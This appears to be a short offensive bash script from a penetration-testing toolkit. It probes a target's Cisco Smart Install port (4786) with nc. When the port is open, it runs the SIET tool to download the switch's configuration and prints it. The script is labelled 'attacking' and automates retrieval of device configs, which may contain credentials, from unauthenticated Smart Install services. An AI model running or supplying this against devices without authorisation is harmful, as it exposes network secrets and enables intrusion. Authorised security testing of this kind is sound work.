#!/bin/bash

WAIT=2
DPORT=4786
#https://github.com/Sab0tag3d/SIET

if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo '[*] attacking Cisco Smart Install'
	/opt/SIET/siet.py -i $1 -g
	if [ -s "/opt/SIET/conf/$1.conf" ]; then
		cat "/opt/SIET/conf/$1.conf"
	fi
fi